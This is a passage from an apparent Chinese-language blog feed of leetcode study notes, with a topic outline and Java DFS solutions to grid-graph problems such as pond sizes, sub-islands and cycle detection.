<h2 id="二维差分"><a href="#二维差分" class="headerlink" title="二维差分"></a>二维差分</h2><h1 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h1><h2 id="基础-1"><a href="#基础-1" class="headerlink" title="基础"></a>基础</h2><h2 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h2><h2 id="邻项消除"><a href="#邻项消除" class="headerlink" title="邻项消除"></a>邻项消除</h2><h2 id="合法括号字符串"><a href="#合法括号字符串" class="headerlink" title="合法括号字符串"></a>合法括号字符串</h2><h2 id="表达式解析"><a href="#表达式解析" class="headerlink" title="表达式解析"></a>表达式解析</h2><h2 id="对顶栈"><a href="#对顶栈" class="headerlink" title="对顶栈"></a>对顶栈</h2><h2 id="单调栈"><a href="#单调栈" class="headerlink" title="单调栈"></a>单调栈</h2><h1 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h1><h2 id="基础-2"><a href="#基础-2" class="headerlink" title="基础"></a>基础</h2><h2 id="设计"><a href="#设计" class="headerlink" title="设计"></a>设计</h2><h2 id="单调队列"><a href="#单调队列" class="headerlink" title="单调队列"></a>单调队列</h2><h2 id="单调队列优化-DP"><a href="#单调队列优化-DP" class="headerlink" title="单调队列优化 DP"></a>单调队列优化 DP</h2><h1 id="堆（优先队列）"><a href="#堆（优先队列）" class="headerlink" title="堆（优先队列）"></a>堆（优先队列）</h1><h2 id="基础-3"><a href="#基础-3" class="headerlink" title="基础"></a>基础</h2><h2 id="进阶-1"><a href="#进阶-1" class="headerlink" title="进阶"></a>进阶</h2><h2 id="重排元素"><a href="#重排元素" class="headerlink" title="重排元素"></a>重排元素</h2><h2 id="第-K-小-x2F-大"><a href="#第-K-小-x2F-大" class="headerlink" title="第 K 小&#x2F;大"></a>第 K 小&#x2F;大</h2><h2 id="反悔堆"><a href="#反悔堆" class="headerlink" title="反悔堆"></a>反悔堆</h2><h2 id="懒删除堆"><a href="#懒删除堆" class="headerlink" title="懒删除堆"></a>懒删除堆</h2><h2 id="对顶堆"><a href="#对顶堆" class="headerlink" title="对顶堆"></a>对顶堆</h2><h1 id="字典树（trie）"><a href="#字典树（trie）" class="headerlink" title="字典树（trie）"></a>字典树（trie）</h1><h2 id="基础-4"><a href="#基础-4" class="headerlink" title="基础"></a>基础</h2><h2 id="进阶-2"><a href="#进阶-2" class="headerlink" title="进阶"></a>进阶</h2><h2 id="字典树优化-DP"><a href="#字典树优化-DP" class="headerlink" title="字典树优化 DP"></a>字典树优化 DP</h2><h2 id="0-1-字典树（异或字典树）"><a href="#0-1-字典树（异或字典树）" class="headerlink" title="0-1 字典树（异或字典树）"></a>0-1 字典树（异或字典树）</h2><h1 id="并查集"><a href="#并查集" class="headerlink" title="并查集"></a>并查集</h1><p><a href="https://zhuanlan.zhihu.com/p/93647900">算法学习笔记(1) : 并查集 - 知乎 (zhihu.com)</a></p>
<h2 id="基础-5"><a href="#基础-5" class="headerlink" title="基础"></a>基础</h2><h2 id="进阶-3"><a href="#进阶-3" class="headerlink" title="进阶"></a>进阶</h2>]]></content>
      <tags>
        <tag>coding</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode_网格图</title>
    <url>/2024/08/27/leetcode-%E7%BD%91%E6%A0%BC%E5%9B%BE/</url>
    <content><![CDATA[<p><a href="https://leetcode.cn/circle/discuss/YiXPXW/">分享丨【题单】网格图（DFS&#x2F;BFS&#x2F;综合应用） - 力扣（LeetCode）</a></p>
<span id="more"></span>

<p>[toc]</p>
<h2 id="网格图-DFS"><a href="#网格图-DFS" class="headerlink" title="网格图 DFS"></a>网格图 DFS</h2><h3 id="面试题-16-19-水域大小"><a href="#面试题-16-19-水域大小" class="headerlink" title="面试题 16.19. 水域大小"></a><a href="https://leetcode.cn/problems/pond-sizes-lcci/">面试题 16.19. 水域大小</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">很简单的dfs</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] pondSizes(<span class="type">int</span>[][] land) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> land.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> land[<span class="number">0</span>].length;</span><br><span class="line">        <span class="type">boolean</span>[][] visited = <span class="keyword">new</span> <span class="title class_">boolean</span>[m][n];</span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> retVal;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((retVal = dfs(land, visited, i, j, m, n)) != <span class="number">0</span>) &#123;</span><br><span class="line">                    list.add(retVal);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        list.sort(Comparator.naturalOrder());</span><br><span class="line">        <span class="keyword">return</span> list.stream().mapToInt(k -&gt; k).toArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span>[][] land, <span class="type">boolean</span>[][] visited, <span class="type">int</span> i, <span class="type">int</span> j, <span class="type">int</span> m, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= m || j &lt; <span class="number">0</span> || j &gt;= n || land[i][j] != <span class="number">0</span> || visited[i][j]) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        visited[i][j] = <span class="literal">true</span>;</span><br><span class="line">        sum += dfs(land, visited, i - <span class="number">1</span>, j - <span class="number">1</span>, m, n);</span><br><span class="line">        sum += dfs(land, visited, i - <span class="number">1</span>, j, m, n);</span><br><span class="line">        sum += dfs(land, visited, i - <span class="number">1</span>, j + <span class="number">1</span>, m, n);</span><br><span class="line">        sum += dfs(land, visited, i, j + <span class="number">1</span>, m, n);</span><br><span class="line">        sum += dfs(land, visited, i, j - <span class="number">1</span>, m, n);</span><br><span class="line">        sum += dfs(land, visited, i + <span class="number">1</span>, j - <span class="number">1</span>, m, n);</span><br><span class="line">        sum += dfs(land, visited, i + <span class="number">1</span>, j, m, n);</span><br><span class="line">        sum += dfs(land, visited, i + <span class="number">1</span>, j + <span class="number">1</span>, m, n);</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="LCS-03-主题空间"><a href="#LCS-03-主题空间" class="headerlink" title="LCS 03. 主题空间"></a><a href="https://leetcode.cn/problems/YesdPw/">LCS 03. 主题空间</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用一个类成员变量记录是否与边缘连接和另外一个成员成员变量记录面积，使用visit避免重复访问</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">area</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span>[] dx = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;-<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span>[] dy = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">largestArea</span><span class="params">(String[] grid)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> grid.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> grid[<span class="number">0</span>].length();</span><br><span class="line"></span><br><span class="line">        <span class="type">boolean</span>[][] visited = <span class="keyword">new</span> <span class="title class_">boolean</span>[m][n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!visited[i][j] &amp;&amp; grid[i].charAt(j) != <span class="string">&#x27;0&#x27;</span>) &#123;</span><br><span class="line">                    dfs(grid, visited, i, j, m, n, grid[i].charAt(j));</span><br><span class="line">                    <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">                        res = Integer.max(res, area);</span><br><span class="line">                    &#125;</span><br><span class="line">                    area = <span class="number">0</span>;</span><br><span class="line">                    flag = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(String[] grid, <span class="type">boolean</span>[][] visited, <span class="type">int</span> i, <span class="type">int</span> j, <span class="type">int</span> m, <span class="type">int</span> n, <span class="type">char</span> ch)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= m || j &lt; <span class="number">0</span> || j &gt;= n ||visited[i][j]|| grid[i].charAt(j) != ch) <span class="keyword">return</span>;</span><br><span class="line">        visited[i][j] = <span class="literal">true</span>;</span><br><span class="line">        area++;</span><br><span class="line">        <span class="keyword">if</span> (isOuter(grid, i, j, m, n)) flag = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">way</span> <span class="operator">=</span> <span class="number">0</span>; way &lt; <span class="number">4</span>; way++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">newI</span> <span class="operator">=</span> i + dx[way];</span><br><span class="line">            <span class="type">int</span> <span class="variable">newJ</span> <span class="operator">=</span> j + dy[way];</span><br><span class="line">            dfs(grid, visited, newI, newJ, m, n, ch);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//是否靠近走廊</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isOuter</span><span class="params">(String[] grid, <span class="type">int</span> i, <span class="type">int</span> j, <span class="type">int</span> m, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">res</span> <span class="operator">=</span> (i == <span class="number">0</span> || i == m - <span class="number">1</span> || j == <span class="number">0</span> || j == n - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (res) <span class="keyword">return</span> res;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">way</span> <span class="operator">=</span> <span class="number">0</span>; way &lt; <span class="number">4</span>; way++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">newI</span> <span class="operator">=</span> i + dx[way];</span><br><span class="line">            <span class="type">int</span> <span class="variable">newJ</span> <span class="operator">=</span> j + dy[way];</span><br><span class="line">            <span class="keyword">if</span> (grid[newI].charAt(newJ) == <span class="string">&#x27;0&#x27;</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>难道不难比较繁琐但</p>
<h3 id="2658-网格图中鱼的最大数目"><a href="#2658-网格图中鱼的最大数目" class="headerlink" title="2658. 网格图中鱼的最大数目"></a><a href="https://leetcode.cn/problems/maximum-number-of-fish-in-a-grid/">2658. 网格图中鱼的最大数目</a></h3><p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findMaxFish</span><span class="params">(<span class="type">int</span>[][] land)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> land.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> land[<span class="number">0</span>].length;</span><br><span class="line">        <span class="type">boolean</span>[][] visited = <span class="keyword">new</span> <span class="title class_">boolean</span>[m][n];</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                res = Integer.max(dfs(land, visited, i, j, m, n), res);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span>[][] land, <span class="type">boolean</span>[][] visited, <span class="type">int</span> i, <span class="type">int</span> j, <span class="type">int</span> m, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= m || j &lt; <span class="number">0</span> || j &gt;= n || land[i][j] == <span class="number">0</span> || visited[i][j]) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> land[i][j];</span><br><span class="line">        visited[i][j] = <span class="literal">true</span>;</span><br><span class="line">        sum += dfs(land, visited, i - <span class="number">1</span>, j, m, n);<span class="comment">//不用走上面，因为之前肯定有上面走下面得过程</span></span><br><span class="line">        sum += dfs(land, visited, i + <span class="number">1</span>, j, m, n);</span><br><span class="line">        sum += dfs(land, visited, i, j - <span class="number">1</span>, m, n);</span><br><span class="line">        sum += dfs(land, visited, i, j + <span class="number">1</span>, m, n);</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1034-边界着色"><a href="#1034-边界着色" class="headerlink" title="1034. 边界着色"></a><a href="https://leetcode.cn/problems/coloring-a-border/">1034. 边界着色</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">从给定位置开始dfs就行</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[][] colorBorder(<span class="type">int</span>[][] grid, <span class="type">int</span> row, <span class="type">int</span> col, <span class="type">int</span> color) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> grid.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> grid[<span class="number">0</span>].length;</span><br><span class="line">        <span class="type">boolean</span>[][] visited = <span class="keyword">new</span> <span class="title class_">boolean</span>[m][n];</span><br><span class="line">        dfs(grid, visited, color, grid[row][col], row, col, m, n);</span><br><span class="line">        <span class="keyword">return</span> grid;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span>[][] grid, <span class="type">boolean</span>[][] visited, <span class="type">int</span> targetColor, <span class="type">int</span> preColor, <span class="type">int</span> i, <span class="type">int</span> j, <span class="type">int</span> m, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= m || j &lt; <span class="number">0</span> || j &gt;= n) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (visited[i][j]) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (grid[i][j] != preColor) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        visited[i][j] = <span class="literal">true</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        flag |= dfs(grid, visited, targetColor, preColor, i - <span class="number">1</span>, j, m, n);</span><br><span class="line">        flag |= dfs(grid, visited, targetColor, preColor, i + <span class="number">1</span>, j, m, n);</span><br><span class="line">        flag |= dfs(grid, visited, targetColor, preColor, i, j - <span class="number">1</span>, m, n);</span><br><span class="line">        flag |= dfs(grid, visited, targetColor, preColor, i, j + <span class="number">1</span>, m, n);</span><br><span class="line">        <span class="keyword">if</span> (flag) grid[i][j] = targetColor;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1905-统计子岛屿"><a href="#1905-统计子岛屿" class="headerlink" title="1905. 统计子岛屿"></a><a href="https://leetcode.cn/problems/count-sub-islands/">1905. 统计子岛屿</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">纸老虎，遍历grid2并且加个visit数组记录访问即可</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">included</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">countSubIslands</span><span class="params">(<span class="type">int</span>[][] grid1, <span class="type">int</span>[][] grid2)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> grid1.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> grid1[<span class="number">0</span>].length;</span><br><span class="line">        <span class="type">boolean</span>[][] visited = <span class="keyword">new</span> <span class="title class_">boolean</span>[m][n];</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (grid2[i][j] == <span class="number">1</span> &amp;&amp; !visited[i][j]) &#123;</span><br><span class="line">                    travel(grid1, grid2, visited, i, j, m, n);</span><br><span class="line">                    <span class="keyword">if</span> (included) res++;</span><br><span class="line">                    included = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">travel</span><span class="params">(<span class="type">int</span>[][] grid1, <span class="type">int</span>[][] grid2, <span class="type">boolean</span>[][] visited, <span class="type">int</span> i, <span class="type">int</span> j, <span class="type">int</span> m, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= m || j &lt; <span class="number">0</span> || j &gt;= n || grid2[i][j] == <span class="number">0</span> || visited[i][j]) <span class="keyword">return</span>;</span><br><span class="line">        visited[i][j] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (grid1[i][j] == <span class="number">0</span>) included = <span class="literal">false</span>;</span><br><span class="line">        travel(grid1, grid2, visited, i - <span class="number">1</span>, j, m, n);</span><br><span class="line">        travel(grid1, grid2, visited, i + <span class="number">1</span>, j, m, n);</span><br><span class="line">        travel(grid1, grid2, visited, i, j - <span class="number">1</span>, m, n);</span><br><span class="line">        travel(grid1, grid2, visited, i, j + <span class="number">1</span>, m, n);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1391-检查网格中是否存在有效路径"><a href="#1391-检查网格中是否存在有效路径" class="headerlink" title="1391. 检查网格中是否存在有效路径"></a><a href="https://leetcode.cn/problems/check-if-there-is-a-valid-path-in-a-grid/">1391. 检查网格中是否存在有效路径</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">并查集或dfs</span><br><span class="line"></span><br><span class="line">dfs做法：通过构建pipe数组，将每个拼图转化为四个方向上的移动限制图。</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">NOP</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">UP</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">DOWN</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">LEFT</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">RIGHT</span> <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">res</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="type">int</span>[] fourDirection = &#123;UP, DOWN, LEFT, RIGHT&#125;;</span><br><span class="line">    <span class="comment">//上下左右</span></span><br><span class="line">    <span class="type">int</span>[] dx = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;-<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span>[] dy = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">1</span>&#125;;</span><br><span class="line">    <span class="type">int</span>[][] move = <span class="keyword">new</span> <span class="title class_">int</span>[][]&#123;</span><br><span class="line">            &#123;NOP, NOP, NOP, NOP&#125;,</span><br><span class="line">            &#123;NOP, NOP, LEFT, RIGHT&#125;,</span><br><span class="line">            &#123;UP, DOWN, NOP, NOP&#125;,</span><br><span class="line">            &#123;LEFT, NOP, NOP, DOWN&#125;,</span><br><span class="line">            &#123;RIGHT, NOP, DOWN, NOP&#125;,<span class="comment">//4</span></span><br><span class="line">            &#123;NOP, LEFT, NOP, UP&#125;,</span><br><span class="line">            &#123;NOP, RIGHT, UP, NOP&#125;,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasValidPath</span><span class="params">(<span class="type">int</span>[][] grid)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> grid.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> grid[<span class="number">0</span>].length;</span><br><span class="line">        <span class="keyword">if</span>(m == <span class="number">1</span> &amp;&amp; n == <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">boolean</span>[][] visited = <span class="keyword">new</span> <span class="title class_">boolean</span>[m][n];</span><br><span class="line">        visited[<span class="number">0</span>][<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> direction : fourDirection) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">nextDirection</span> <span class="operator">=</span> move[grid[<span class="number">0</span>][<span class="number">0</span>]][direction];</span><br><span class="line">            <span class="keyword">if</span> (nextDirection != NOP) &#123;</span><br><span class="line">                dfs(grid, visited, dx[nextDirection], dy[nextDirection], m, n, nextDirection);</span><br><span class="line">                <span class="keyword">if</span>(res) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span>[][] grid, <span class="type">boolean</span>[][] visited, <span class="type">int</span> i, <span class="type">int</span> j, <span class="type">int</span> m, <span class="type">int</span> n, <span class="type">int</span> preDirection)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= m || j &lt; <span class="number">0</span> || j &gt;= n || visited[i][j] || res) <span class="keyword">return</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">nextDirection</span> <span class="operator">=</span> move[grid[i][j]][preDirection];</span><br><span class="line">        <span class="keyword">if</span> (move[grid[i][j]][preDirection] == NOP) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span> (i == m - <span class="number">1</span> &amp;&amp; j == n - <span class="number">1</span>) &#123;</span><br><span class="line">            res = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        visited[i][j] = <span class="literal">true</span>;</span><br><span class="line">        dfs(grid, visited, i + dx[nextDirection], j + dy[nextDirection], m, n, nextDirection);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>难倒不难，主要比较麻烦。</p>
<p>这里是否访问数组并不需要其实，因为最多访问m *n个格子，记录访问格子次数即可</p>
<p><a href="https://leetcode.cn/problems/check-if-there-is-a-valid-path-in-a-grid/solutions/2904060/jiang-mei-ge-pin-tu-zhuan-hua-wei-si-ge-j9601/">我的题解</a></p>
<p>todo：之后试试并查集做法</p>
<h3 id="529-扫雷游戏"><a href="#529-扫雷游戏" class="headerlink" title="529. 扫雷游戏"></a><a href="https://leetcode.cn/problems/minesweeper/">529. 扫雷游戏</a></h3><h3 id="1559-二维网格图中探测环"><a href="#1559-二维网格图中探测环" class="headerlink" title="1559. 二维网格图中探测环"></a><a href="https://leetcode.cn/problems/detect-cycles-in-2d-grid/">1559. 二维网格图中探测环</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dfs 关键只怎样找到是否是返回前面格子，判断环只需要判断访问即可</span><br><span class="line">找到是否是返回前面格子 函数加个前面值的记录</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span>[] dx = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;-<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span>[] dy = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">1</span>&#125;;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">res</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">containsCycle</span><span class="params">(<span class="type">char</span>[][] grid)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> grid.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> grid[<span class="number">0</span>].length;</span><br><span class="line">        <span class="type">boolean</span>[][] visited = <span class="keyword">new</span> <span class="title class_">boolean</span>[m][n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!visited[i][j]) &#123;</span><br><span class="line">                    dfs(grid, visited, -<span class="number">1</span>, -<span class="number">1</span>, i, j, m, n, grid[i][j]);</span><br><span class="line">                    <span class="keyword">if</span> (res) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">char</span>[][] grid, <span class="type">boolean</span>[][] visited, <span class="type">int</span> preI, <span 